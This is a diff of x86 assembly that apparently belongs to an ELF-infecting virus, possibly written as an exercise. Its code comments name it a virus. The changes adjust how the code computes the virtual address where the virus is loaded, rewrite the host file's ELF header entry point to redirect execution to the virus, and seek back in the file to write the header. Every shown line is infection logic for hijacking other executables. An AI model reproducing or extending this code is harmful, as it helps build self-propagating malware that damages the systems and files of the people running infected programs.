@@ -144,7 +144,7 @@ _start:	push	ebp
 	mov dword [ebp-36],ebx ; save vaddr2
 
 
-modify_ph:
+	.modify_ph:
 	mov ecx,ebp
 	sub ecx,200
 	add ecx,HEADER_SIZE
@@ -160,15 +160,15 @@ modify_ph:
 	write dword [ebp-8],dword [ebp-40],PHDR_size
 
 	.change_header:
-	mov eax, dword [ebp-12] ; saves amount of bytes read
-	add eax, dword [ebp-36] ; EBP-36 the vaddr2
-	add dword [ebp-16],eax ; now ebp-16 holds the starting virtual location of the virus loaded
-	mov eax, dword [ebp-16] ;save the value in eax
+	mov eax, dword [ebp-12] ; saves amount of bytes read = filesize
+	add eax, dword [ebp-36] ; EBP-36 the vaddr2-offset
+	mov dword [ebp-16],eax ; now ebp-16 holds the starting virtual location of the virus loaded
+	; mov eax, dword [ebp-16] ;save the value in eax
 	add eax,_start-my_start ; add to be the start to be ran. new entry point
 	mov dword [ebp-24],eax ; save new ep
 	mov ecx,ebp
 	sub ecx,200
-	mov dword [ecx+24],eax ;change the header
+	mov dword [ecx+ENTRY],eax ;change the header
 	lseek dword [ebp-8],0,SEEK_SET ; changing to the beginning of the file
 	mov ecx,ebp
 	sub ecx,200
